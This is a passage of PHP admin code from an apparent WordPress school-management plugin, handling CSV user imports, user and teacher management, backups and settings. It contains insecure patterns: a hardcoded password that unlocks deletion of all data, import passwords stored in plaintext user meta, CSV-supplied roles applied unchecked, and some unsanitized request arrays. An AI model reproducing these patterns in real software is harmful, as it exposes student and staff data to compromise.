                $school_id = intval($_POST['target_school_id']);
                $import_type = sanitize_text_field($_POST['import_type']);

                global $wpdb;
                $school_name = $wpdb->get_var($wpdb->prepare("SELECT name FROM {$wpdb->prefix}eess_schools WHERE id = %d", $school_id));
                if (!$school_name) {
                    wp_redirect(add_query_arg('sm_admin_msg', 'error', $_SERVER['REQUEST_URI']));
                    exit;
                }

                $handle = fopen($_FILES['csv_file']['tmp_name'], "r");
                $header = fgetcsv($handle);
                if (!$header) {
                    fclose($handle);
                    wp_redirect(add_query_arg('sm_admin_msg', 'error', $_SERVER['REQUEST_URI']));
                    exit;
                }

                // Clean and normalize headers to find indexes
                $headers = array();
                foreach ($header as $idx => $h) {
                    $h_norm = preg_replace('/[\x{FEFF}\x{200B}]/u', '', $h);
                    $headers[trim(strtolower($h_norm))] = $idx;
                }

                // Helper to find column index by multiple candidate names (Arabic/English)
                $find_col = function($candidates) use ($headers) {
                    foreach ($candidates as $c) {
                        $c_clean = trim(strtolower($c));
                        if (isset($headers[$c_clean])) {
                            return $headers[$c_clean];
                        }
                    }
                    return -1;
                };

                // Find candidate columns based on import type
                $col_name = $find_col(['الاسم', 'الاسم الكامل', 'name', 'student name', 'display_name', 'اسم']);
                $col_username = $find_col(['اسم المستخدم', 'username', 'login', 'user_login']);
                $col_email = $find_col(['البريد', 'البريد الإلكتروني', 'email', 'user_email', 'parent_email', 'بريد ولي الأمر']);
                $col_phone = $find_col(['الهاتف', 'رقم الهاتف', 'phone', 'sm_phone', 'guardian_phone', 'جوال ولي الأمر', 'رقم الجوال']);
                $col_password = $find_col(['كلمة المرور', 'password', 'pass', 'كلمة السر']);
                $col_grade = $find_col(['الصف', 'الصف الدراسي', 'grade', 'class_name']);
                $col_section = $find_col(['الشعبة', 'الفصل', 'section', 'class', 'المجموعة']);
                $col_division = $find_col(['الحلقة', 'النطاق', 'division', 'cycle']);
                $col_specialization = $find_col(['التخصص', 'المادة', 'specialization', 'subject']);
                $col_emp_num = $find_col(['الرقم الوظيفي', 'employee_number', 'code', 'الكود', 'رقم الهوية', 'الرقم القومي / الهوية']);
                $col_dept = $find_col(['القسم', 'department', 'dept', 'الإدارة']);
                $col_role = $find_col(['الرتبة', 'الدور', 'role', 'المسمى الوظيفي']);
                $col_student_code = $find_col(['كود الطالب', 'كود الابن', 'student_code', 'child_code', 'رقم الهوية الوطنية / الكود']);

                $count = 0;
                while (($data = fgetcsv($handle)) !== FALSE) {
                    // Normalize data encoding
                    foreach ($data as $k => $v) {
                        $encoding = mb_detect_encoding($v, array('UTF-8', 'ISO-8859-6', 'ISO-8859-1'), true);
                        if ($encoding && $encoding != 'UTF-8') {
                            $data[$k] = mb_convert_encoding($v, 'UTF-8', $encoding);
                        }
                        $data[$k] = trim($data[$k]);
                    }

                    // Extract values dynamically based on index
                    $val_name = ($col_name !== -1 && isset($data[$col_name])) ? $data[$col_name] : '';
                    $val_username = ($col_username !== -1 && isset($data[$col_username])) ? $data[$col_username] : '';
                    $val_email = ($col_email !== -1 && isset($data[$col_email])) ? $data[$col_email] : '';
                    $val_phone = ($col_phone !== -1 && isset($data[$col_phone])) ? $data[$col_phone] : '';
                    $val_password = ($col_password !== -1 && isset($data[$col_password])) ? $data[$col_password] : wp_generate_password();
                    $val_grade = ($col_grade !== -1 && isset($data[$col_grade])) ? $data[$col_grade] : '';
                    $val_section = ($col_section !== -1 && isset($data[$col_section])) ? $data[$col_section] : '';
                    $val_division = ($col_division !== -1 && isset($data[$col_division])) ? $data[$col_division] : '';
                    $val_specialization = ($col_specialization !== -1 && isset($data[$col_specialization])) ? $data[$col_specialization] : '';
                    $val_emp_num = ($col_emp_num !== -1 && isset($data[$col_emp_num])) ? $data[$col_emp_num] : '';
                    $val_dept = ($col_dept !== -1 && isset($data[$col_dept])) ? $data[$col_dept] : '';
                    $val_role = ($col_role !== -1 && isset($data[$col_role])) ? $data[$col_role] : '';
                    $val_student_code = ($col_student_code !== -1 && isset($data[$col_student_code])) ? $data[$col_student_code] : '';

                    if ($import_type === 'students') {
                        if (empty($val_name)) continue;

                        // 1. Detect and create Division if exists in columns
                        $division_id = null;
                        if (!empty($val_division)) {
                            $division_id = $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}eess_divisions WHERE school_id = %d AND name = %s", $school_id, $val_division));
                            if (!$division_id) {
                                $wpdb->insert("{$wpdb->prefix}eess_divisions", array(
                                    'school_id' => $school_id,
                                    'name' => $val_division,
                                    'status' => 'active'
                                ));
                                $division_id = $wpdb->insert_id;
                            }
                        }

                        // 2. Detect and create Grade
                        $grade_id = null;
                        if (!empty($val_grade)) {
                            $grade_id = $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}eess_grades WHERE school_id = %d AND name = %s", $school_id, $val_grade));
                            if (!$grade_id) {
                                $wpdb->insert("{$wpdb->prefix}eess_grades", array(
                                    'school_id' => $school_id,
                                    'name' => $val_grade,
                                    'division_id' => $division_id
                                ));
                                $grade_id = $wpdb->insert_id;
                            } else if ($division_id) {
                                // Sync division_id
                                $wpdb->update("{$wpdb->prefix}eess_grades", array('division_id' => $division_id), array('id' => $grade_id));
                            }
                        }

                        // 3. Detect and create Class
                        $class_id = null;
                        if ($grade_id && !empty($val_section)) {
                            $class_id = $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}eess_classes WHERE grade_id = %d AND name = %s", $grade_id, $val_section));
                            if (!$class_id) {
                                $wpdb->insert("{$wpdb->prefix}eess_classes", array(
                                    'grade_id' => $grade_id,
                                    'name' => $val_section
                                ));
                                $class_id = $wpdb->insert_id;
                            }
                        }

                        // 4. Create/update Student
                        $student_id = SM_DB::student_exists($val_name, $val_grade, $val_section, $val_emp_num);
                        if ($student_id) {
                            SM_DB::update_student($student_id, array(
                                'name' => $val_name,
                                'class_name' => $val_grade,
                                'section' => $val_section,
                                'parent_email' => $val_email,
                                'guardian_phone' => $val_phone,
                                'national_id' => $val_emp_num,
                                'school_id' => $school_id,
                                'grade_id' => $grade_id,
                                'class_id' => $class_id,
                                'institution_id' => 1
                            ));
                        } else {
                            $extra = array(
                                'guardian_phone' => $val_phone,
                                'nationality' => '',
                                'national_id' => $val_emp_num,
                                'school_id' => $school_id,
                                'grade_id' => $grade_id,
                                'class_id' => $class_id,
                                'institution_id' => 1
                            );
                            $student_id = SM_DB::add_student($val_name, $val_grade, $val_email, '', null, null, $val_section, $extra);
                        }
                        if ($student_id) $count++;
                    }

                    elseif ($import_type === 'teachers') {
                        if (empty($val_username) || empty($val_name)) continue;

                        $user = get_user_by('login', $val_username);
                        if ($user) {
                            $user_id = $user->ID;
                            wp_update_user(array('ID' => $user_id, 'user_email' => $val_email, 'display_name' => $val_name));
                        } else {
                            $user_id = wp_insert_user(array(
                                'user_login' => $val_username,
                                'user_email' => $val_email ?: ($val_username . '@school.local'),
                                'display_name' => $val_name,
                                'user_pass' => $val_password
                            ));
                        }

                        if ($user_id && !is_wp_error($user_id)) {
                            SM_Settings::change_user_role($user_id, 'sm_teacher', array('specialization' => $val_specialization));
                            update_user_meta($user_id, 'sm_phone', $val_phone);
                            update_user_meta($user_id, 'eess_employee_number', $val_emp_num);
                            update_user_meta($user_id, 'eess_department', $val_dept);
                            update_user_meta($user_id, 'eess_school_name', $school_name);
                            update_user_meta($user_id, 'eess_school_id', $school_id);

                            // Assignment
                            $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
                            $wpdb->insert("{$wpdb->prefix}eess_user_assignments", array(
                                'user_id' => $user_id,
                                'institution_id' => 1,
                                'school_id' => $school_id
                            ));
                            $count++;
                        }
                    }

                    elseif ($import_type === 'parents') {
                        if (empty($val_username) || empty($val_name)) continue;

                        $user = get_user_by('login', $val_username);
                        if ($user) {
                            $user_id = $user->ID;
                            wp_update_user(array('ID' => $user_id, 'user_email' => $val_email, 'display_name' => $val_name));
                        } else {
                            $user_id = wp_insert_user(array(
                                'user_login' => $val_username,
                                'user_email' => $val_email ?: ($val_username . '@parent.local'),
                                'display_name' => $val_name,
                                'user_pass' => $val_password
                            ));
                        }

                        if ($user_id && !is_wp_error($user_id)) {
                            SM_Settings::change_user_role($user_id, 'sm_parent');
                            update_user_meta($user_id, 'sm_phone', $val_phone);
                            update_user_meta($user_id, 'eess_school_name', $school_name);
                            update_user_meta($user_id, 'eess_school_id', $school_id);

                            // Map to child
                            if (!empty($val_student_code)) {
                                $wpdb->query($wpdb->prepare("UPDATE {$wpdb->prefix}sm_students SET parent_user_id = %d WHERE student_code = %s", $user_id, $val_student_code));
                            }
                            $count++;
                        }
                    }

                    elseif ($import_type === 'managers' || $import_type === 'users') {
                        if (empty($val_username) || empty($val_name)) continue;

                        $role = 'sm_supervisor';
                        if (!empty($val_role)) {
                            if ($val_role === 'sm_principal' || $val_role === 'principal' || $val_role === 'مدير') {
                                $role = 'sm_principal';
                            } elseif ($val_role === 'sm_system_admin' || $val_role === 'admin' || $val_role === 'مسؤول') {
                                $role = 'sm_system_admin';
                            }
                        }

                        $user = get_user_by('login', $val_username);
                        if ($user) {
                            $user_id = $user->ID;
                            wp_update_user(array('ID' => $user_id, 'user_email' => $val_email, 'display_name' => $val_name));
                        } else {
                            $user_id = wp_insert_user(array(
                                'user_login' => $val_username,
                                'user_email' => $val_email ?: ($val_username . '@user.local'),
                                'display_name' => $val_name,
                                'user_pass' => $val_password
                            ));
                        }

                        if ($user_id && !is_wp_error($user_id)) {
                            SM_Settings::change_user_role($user_id, $role);
                            update_user_meta($user_id, 'sm_phone', $val_phone);
                            update_user_meta($user_id, 'eess_school_name', $school_name);
                            update_user_meta($user_id, 'eess_school_id', $school_id);

                            $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
                            $wpdb->insert("{$wpdb->prefix}eess_user_assignments", array(
                                'user_id' => $user_id,
                                'institution_id' => 1,
                                'school_id' => $school_id
                            ));
                            $count++;
                        }
                    }
                }
                fclose($handle);
                wp_cache_flush();
                SM_Logger::log('استيراد البيانات الشامل للمدرسة', "تم استيراد ($count) سجل بنجاح للمدرسة: $school_name.");
                wp_redirect(add_query_arg('sm_admin_msg', 'csv_imported', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Hierarchical Violations Save
        if (isset($_POST['sm_save_hierarchical_violations']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                $processed = array();
                if (isset($_POST['h_viol']) && is_array($_POST['h_viol'])) {
                    foreach ($_POST['h_viol'] as $level => $items) {
                        $processed[$level] = array();
                        foreach ($items as $item) {
                            if (!empty($item['name'])) {
                                $code = !empty($item['code']) ? $item['code'] : 'V'.rand(100,999);
                                $processed[$level][$code] = array(
                                    'name' => sanitize_text_field($item['name']),
                                    'points' => intval($item['points']),
                                    'action' => sanitize_text_field($item['action'])
                                );
                            }
                        }
                    }
                }
                SM_Settings::save_hierarchical_violations($processed);
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Parent Call-in Request
        if (isset($_POST['sm_send_call_in']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_message_action')) {
            if (current_user_can('إدارة_أولياء_الأمور')) {
                $receiver_id = intval($_POST['receiver_id']);
                $message = "🔴 طلب استدعاء رسمي: " . sanitize_textarea_field($_POST['message']);
                SM_DB::send_message(get_current_user_id(), $receiver_id, $message);
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Generic User Update
        if (isset($_POST['sm_update_generic_user']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_user_action')) {
            if (current_user_can('إدارة_المستخدمين')) {
                $user_id = intval($_POST['edit_user_id']);
                $user_data = array(
                    'ID' => $user_id,
                    'user_email' => sanitize_email($_POST['user_email']),
                    'display_name' => sanitize_text_field($_POST['display_name'])
                );
                if (!empty($_POST['user_pass'])) {
                    $user_data['user_pass'] = $_POST['user_pass'];
                }
                wp_update_user($user_data);
                
                SM_Settings::change_user_role($user_id, sanitize_text_field($_POST['user_role']), $_POST);

                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Record Saving
        if (isset($_POST['sm_save_record']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_record_action')) {
            $record_id = SM_DB::add_record($_POST);
            if ($record_id) {
                SM_Notifications::send_violation_alert($record_id);
                $url = add_query_arg(array('sm_msg' => 'success', 'last_id' => $record_id), $_SERVER['REQUEST_URI']);
                wp_redirect($url);
                exit;
            }
        }

        // Handle Generic User Addition
        if (isset($_POST['sm_add_user']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_user_action')) {
            if (current_user_can('إدارة_المستخدمين')) {
                $user_data = array(
                    'user_login' => sanitize_user($_POST['user_login']),
                    'user_email' => sanitize_email($_POST['user_email']),
                    'display_name' => sanitize_text_field($_POST['display_name']),
                    'user_pass' => $_POST['user_pass'],
                    'role' => sanitize_text_field($_POST['user_role'])
                );
                wp_insert_user($user_data);
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Generic User Deletion
        if (isset($_POST['sm_delete_user']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_user_action')) {
            if (current_user_can('إدارة_المستخدمين')) {
                require_once(ABSPATH . 'wp-admin/includes/user.php');
                wp_delete_user(intval($_POST['delete_user_id']));
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Teacher Addition from Public Admin
        if (isset($_POST['sm_add_teacher']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_teacher_action')) {
            if (current_user_can('إدارة_المعلمين')) {
                $user_data = array(
                    'user_login' => sanitize_user($_POST['user_login']),
                    'user_email' => sanitize_email($_POST['user_email']),
                    'display_name' => sanitize_text_field($_POST['display_name']),
                    'user_pass' => $_POST['user_pass'],
                    'role' => 'sm_teacher'
                );
                $user_id = wp_insert_user($user_data);
                if (!is_wp_error($user_id)) {
                    update_user_meta($user_id, 'sm_teacher_id', sanitize_text_field($_POST['teacher_id']));
                    update_user_meta($user_id, 'sm_job_title', sanitize_text_field($_POST['job_title']));
                    update_user_meta($user_id, 'sm_phone', sanitize_text_field($_POST['phone']));
                    wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                    exit;
                }
            }
        }

        // Handle Teacher Update
        if (isset($_POST['sm_update_teacher']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_teacher_action')) {
            if (current_user_can('إدارة_المعلمين')) {
                $user_id = intval($_POST['edit_teacher_id']);
                $user_data = array(
                    'ID' => $user_id,
                    'user_email' => sanitize_email($_POST['user_email']),
                    'display_name' => sanitize_text_field($_POST['display_name'])
                );
                if (!empty($_POST['user_pass'])) {
                    $user_data['user_pass'] = $_POST['user_pass'];
                }
                wp_update_user($user_data);
                update_user_meta($user_id, 'sm_teacher_id', sanitize_text_field($_POST['teacher_id']));
                update_user_meta($user_id, 'sm_job_title', sanitize_text_field($_POST['job_title']));
                update_user_meta($user_id, 'sm_phone', sanitize_text_field($_POST['phone']));
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Teacher Deletion
        if (isset($_POST['sm_delete_teacher']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_teacher_action')) {
            if (current_user_can('إدارة_المعلمين')) {
                require_once(ABSPATH . 'wp-admin/includes/user.php');
                wp_delete_user(intval($_POST['delete_teacher_id']));
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Record Update
        if (isset($_POST['sm_update_record']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_record_action')) {
            if (current_user_can('إدارة_المخالفات')) {
                SM_DB::update_record(intval($_POST['record_id']), $_POST);
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Student Addition from Public Admin
        if (isset($_POST['add_student']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_add_student')) {
            if (current_user_can('إدارة_الطلاب')) {
                $parent_user_id = !empty($_POST['parent_user_id']) ? intval($_POST['parent_user_id']) : null;
                $teacher_id = !empty($_POST['teacher_id']) ? intval($_POST['teacher_id']) : null;
                SM_DB::add_student($_POST['name'], $_POST['class'], $_POST['email'], $_POST['code'], $parent_user_id, $teacher_id);
                wp_redirect(add_query_arg('sm_admin_msg', 'student_added', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Student Deletion from Public Admin
        if (isset($_POST['delete_student']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_add_student')) {
            if (current_user_can('إدارة_الطلاب')) {
                SM_DB::delete_student($_POST['delete_student_id']);
                wp_redirect(add_query_arg('sm_admin_msg', 'student_deleted', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Student Update from Public Admin
        if (isset($_POST['sm_update_student']) && wp_verify_nonce($_POST['sm_nonce'], 'sm_add_student')) {
            if (current_user_can('إدارة_الطلاب')) {
                SM_DB::update_student(intval($_POST['student_id']), $_POST);
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Backup Download
        if (isset($_POST['sm_download_backup']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                if (ob_get_length()) ob_clean();
                SM_Settings::record_backup_download();
                $data = SM_DB::get_backup_data();
                header('Content-Type: application/json; charset=utf-8');
                header('Content-Disposition: attachment; filename="sm_backup_'.date('Y-m-d').'.json"');
                header('Pragma: no-cache');
                header('Expires: 0');
                echo $data;
                exit;
            }
        }

        // Handle Restore
        if (isset($_POST['sm_restore_backup']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام') && !empty($_FILES['backup_file']['tmp_name'])) {
                $json = file_get_contents($_FILES['backup_file']['tmp_name']);
                if (SM_DB::restore_backup($json)) {
                    SM_Settings::record_backup_import();
                    wp_redirect(add_query_arg('sm_admin_msg', 'restored', $_SERVER['REQUEST_URI']));
                    exit;
                }
            }
        }

        // Handle Academic Structure Save
        if (isset($_POST['sm_save_academic_structure']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام') || current_user_can('manage_options')) {
                $existing = SM_Settings::get_academic_structure();
                if (isset($_POST['academic_year'])) {
                    $existing['academic_year'] = sanitize_text_field($_POST['academic_year']);
                }
                if (isset($_POST['terms_count'])) {
                    $existing['terms_count'] = intval($_POST['terms_count']);
                }
                if (!isset($existing['term_dates'])) {
                    $existing['term_dates'] = array('term1' => array(), 'term2' => array(), 'term3' => array());
                }
                if (isset($_POST['deadline_term1'])) {
                    $existing['term_dates']['term1']['deadline'] = sanitize_text_field($_POST['deadline_term1']);
                }
                if (isset($_POST['deadline_term2'])) {
                    $existing['term_dates']['term2']['deadline'] = sanitize_text_field($_POST['deadline_term2']);
                }
                if (isset($_POST['deadline_term3'])) {
                    $existing['term_dates']['term3']['deadline'] = sanitize_text_field($_POST['deadline_term3']);
                }
                if (isset($_POST['term_dates'])) {
                    $existing['term_dates'] = array_merge($existing['term_dates'], $_POST['term_dates']);
                }
                if (isset($_POST['academic_stages'])) {
                    $existing['academic_stages'] = $_POST['academic_stages'];
                }
                if (isset($_POST['grades_count'])) {
                    $existing['grades_count'] = intval($_POST['grades_count']);
                }
                if (isset($_POST['active_grades'])) {
                    $existing['active_grades'] = array_map('intval', $_POST['active_grades']);
                }
                SM_Settings::save_academic_structure($existing);
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Unified Settings Save (School Info)
        if (isset($_POST['sm_save_settings_unified']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                $existing = SM_Settings::get_school_info();
                SM_Settings::save_school_info(array(
                    'school_name' => sanitize_text_field($_POST['school_name']),
                    'school_principal_name' => isset($_POST['school_principal_name']) ? sanitize_text_field($_POST['school_principal_name']) : ($existing['school_principal_name'] ?? ''),
                    'school_logo' => esc_url_raw($_POST['school_logo']),
                    'address' => isset($_POST['school_address']) ? sanitize_text_field($_POST['school_address']) : ($existing['address'] ?? ''),
                    'email' => sanitize_email($_POST['school_email']),
                    'phone' => sanitize_text_field($_POST['school_phone']),
                    'working_schedule' => array(
                        'staff' => isset($_POST['work_staff']) ? array_map('sanitize_text_field', $_POST['work_staff']) : ($existing['working_schedule']['staff'] ?? array()),
                        'students' => isset($_POST['work_students']) ? array_map('sanitize_text_field', $_POST['work_students']) : ($existing['working_schedule']['students'] ?? array())
                    )
                ));
                SM_Logger::log('تحديث بيانات السلطة', "تم تحديث بيانات المدرسة والمدير: {$_POST['school_name']}");
                SM_Settings::save_academic_structure(array(
                    'terms_count' => intval($_POST['terms_count']),
                    'grades_count' => intval($_POST['grades_count']),
                    'grade_options' => sanitize_text_field($_POST['grade_options']),
                    'semester_start' => sanitize_text_field($_POST['semester_start']),
                    'semester_end' => sanitize_text_field($_POST['semester_end']),
                    'academic_stages' => sanitize_text_field($_POST['academic_stages'])
                ));
                SM_Settings::save_retention_settings(array(
                    'message_retention_days' => intval($_POST['message_retention_days'])
                ));
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }


        // Handle Central Numbering Settings Save
        if (isset($_POST['sm_save_central_numbering']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                EESS_ID_Code_Service::save_numbering_config($_POST);
                if (!empty($_POST['reset_student_counter_val'])) {
                    EESS_ID_Code_Service::get_next_sequence(1, 'student', intval($_POST['reset_student_counter_val']));
                }
                SM_Logger::log('تحديث نظام الترقيم المركزي', 'تم تعديل قواعد وتنسيق الترقيم المركزي للطلاب والكوادر.');
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Violation Settings Save
        if (isset($_POST['sm_save_violation_settings']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                SM_Logger::log('تحديث إعدادات المخالفات', "تم تحديث أنواع المخالفات والإجراءات المقترحة.");
                $types_raw = explode("\n", str_replace("\r", "", $_POST['violation_types']));
                $types = array();
                foreach ($types_raw as $line) {
                    $parts = explode("|", $line);
                    if (count($parts) == 2) {
                        $types[trim($parts[0])] = trim($parts[1]);
                    }
                }
                if (!empty($types)) {
                    SM_Settings::save_violation_types($types);
                }
                SM_Settings::save_suggested_actions(array(
                    'low' => sanitize_textarea_field($_POST['suggested_low']),
                    'medium' => sanitize_textarea_field($_POST['suggested_medium']),
                    'high' => sanitize_textarea_field($_POST['suggested_high'])
                ));
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Print Templates Save
        // Handle Sidebar Visibility Settings Save
        if (isset($_POST['sm_save_sidebar_visibility']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                $roles_to_process = array(
                    'sm_system_admin', 'sm_principal', 'sm_supervisor', 'sm_coordinator',
                    'sm_teacher', 'sm_student', 'sm_parent', 'sm_discipline_supervisor',
                    'sm_activities_supervisor', 'sm_transportation_supervisor', 'sm_bus_supervisor', 'sm_hr'
                );
                $sections_to_process = array_keys(SM_Settings::get_system_modules());

                $visibility = array();
                $input = isset($_POST['sidebar_visibility']) ? $_POST['sidebar_visibility'] : array();

                foreach ($roles_to_process as $role) {
                    $visibility[$role] = array();
                    foreach ($sections_to_process as $sec) {
                        // Explicitly save false if not checked to prevent falling back to defaults
                        $visibility[$role][$sec] = !empty($input[$role][$sec]);
                    }
                }

                SM_Settings::save_sidebar_visibility($visibility);

                // IMMEDIATELY INVALIDATE CACHES & TRANSIENTS
                global $wpdb;
                $wpdb->query("DELETE FROM {$wpdb->prefix}options WHERE option_name LIKE '_transient_sm_%' OR option_name LIKE '_transient_timeout_sm_%'");
                $wpdb->query("DELETE FROM {$wpdb->prefix}options WHERE option_name LIKE '_transient_eess_%' OR option_name LIKE '_transient_timeout_eess_%'");
                wp_cache_flush();
                $users = get_users(array('fields' => array('ID')));
                foreach ($users as $u) {
                    clean_user_cache($u->ID);
                }

                SM_Logger::log('تحديث إعدادات ظهور القائمة', 'تم تخصيص الأقسام المرئية لكل رتبة في النظام وإلغاء ذاكرة التخزين المؤقت.');
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Notifications Settings Save
        if (isset($_POST['sm_save_notif']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                SM_Settings::save_notifications(array(
                    'email_subject' => sanitize_text_field($_POST['email_subject']),
                    'email_template' => sanitize_textarea_field($_POST['email_template']),
                    'whatsapp_template' => sanitize_textarea_field($_POST['whatsapp_template']),
                    'internal_template' => sanitize_textarea_field($_POST['internal_template'])
                ));
                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Full Reset
        if (isset($_POST['sm_full_reset']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                if ($_POST['reset_password'] === '1011996') {
                    SM_DB::delete_all_data();
                    wp_redirect(add_query_arg('sm_admin_msg', 'demo_deleted', $_SERVER['REQUEST_URI']));
                    exit;
                } else {
                    wp_redirect(add_query_arg('sm_admin_msg', 'error', $_SERVER['REQUEST_URI']));
                    exit;
                }
            }
        }


        // Handle Unified Users CSV Import
        if (isset($_POST['sm_import_users_csv']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_المستخدمين') && !empty($_FILES['csv_file']['tmp_name'])) {
                $handle = fopen($_FILES['csv_file']['tmp_name'], "r");
                $header = fgetcsv($handle); // skip header
                $count = 0;
                while (($data = fgetcsv($handle)) !== FALSE) {
                    if (count($data) >= 3) {
                        $username = sanitize_user($data[0]);
                        $email = !empty($data[1]) ? sanitize_email($data[1]) : $username . '@school-system.local';
                        $display_name = sanitize_text_field($data[2]);
                        $role = isset($data[3]) ? sanitize_text_field($data[3]) : 'sm_teacher';
                        $phone = isset($data[4]) ? sanitize_text_field($data[4]) : '';
                        $password = !empty($data[5]) ? $data[5] : wp_generate_password();
                        $photo_url = isset($data[6]) ? esc_url_raw($data[6]) : '';
                        $specialization = isset($data[7]) ? sanitize_text_field($data[7]) : '';

                        // If user exists, update them; otherwise, insert them!
                        $user = get_user_by('login', $username);
                        if ($user) {
                            $user_id = $user->ID;
                            wp_update_user(array(
                                'ID' => $user_id,
                                'user_email' => $email,
                                'display_name' => $display_name,
                                'user_pass' => $password
                            ));
                            $u_obj = new WP_User($user_id);
                            $u_obj->set_role($role);
                        } else {
                            $user_id = wp_insert_user(array(
                                'user_login' => $username,
                                'user_email' => $email,
                                'display_name' => $display_name,
                                'user_pass' => $password,
                                'role' => $role
                            ));
                        }

                        if (!is_wp_error($user_id)) {
                            $count++;
                            update_user_meta($user_id, 'sm_temp_pass', $password);
                            if (!empty($phone)) {
                                update_user_meta($user_id, 'sm_phone', $phone);
                            }
                            if (!empty($photo_url)) {
                                update_user_meta($user_id, 'eess_profile_photo', $photo_url);
                            }
                            if (!empty($specialization)) {
                                update_user_meta($user_id, 'sm_specialization', $specialization);
                            }
                            clean_user_cache($user_id);
                        }
                    }
                }
                fclose($handle);
                wp_cache_flush();
                SM_Logger::log('استيراد مستخدمين (جماعي)', "تم استيراد ($count) مستخدم بنجاح من ملف CSV.");
                wp_redirect(add_query_arg('sm_admin_msg', 'csv_imported', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Teacher CSV Upload
        if (isset($_POST['sm_import_teachers_csv']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_المعلمين') && !empty($_FILES['csv_file']['tmp_name'])) {
                $handle = fopen($_FILES['csv_file']['tmp_name'], "r");
                $header = fgetcsv($handle); // skip header
                $count = 0;
                while (($data = fgetcsv($handle)) !== FALSE) {
                    if (count($data) >= 3) {
                        // username, email, name, teacher_id, job_title, phone, pass
                        $user_id = wp_insert_user(array(
                            'user_login' => $data[0],
                            'user_email' => $data[1],
                            'display_name' => $data[2],
                            'user_pass' => isset($data[6]) ? $data[6] : wp_generate_password(),
                            'role' => 'sm_teacher'
                        ));
                        if (!is_wp_error($user_id)) {
                            $count++;
                            update_user_meta($user_id, 'sm_teacher_id', isset($data[3]) ? $data[3] : '');
                            update_user_meta($user_id, 'sm_job_title', isset($data[4]) ? $data[4] : '');
                            update_user_meta($user_id, 'sm_phone', isset($data[5]) ? $data[5] : '');
                        }
                    }
                }
                fclose($handle);
                SM_Logger::log('استيراد معلمين (جماعي)', "تم استيراد ($count) معلم بنجاح.");
                wp_redirect(add_query_arg('sm_admin_msg', 'csv_imported', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Violation CSV/Excel Upload
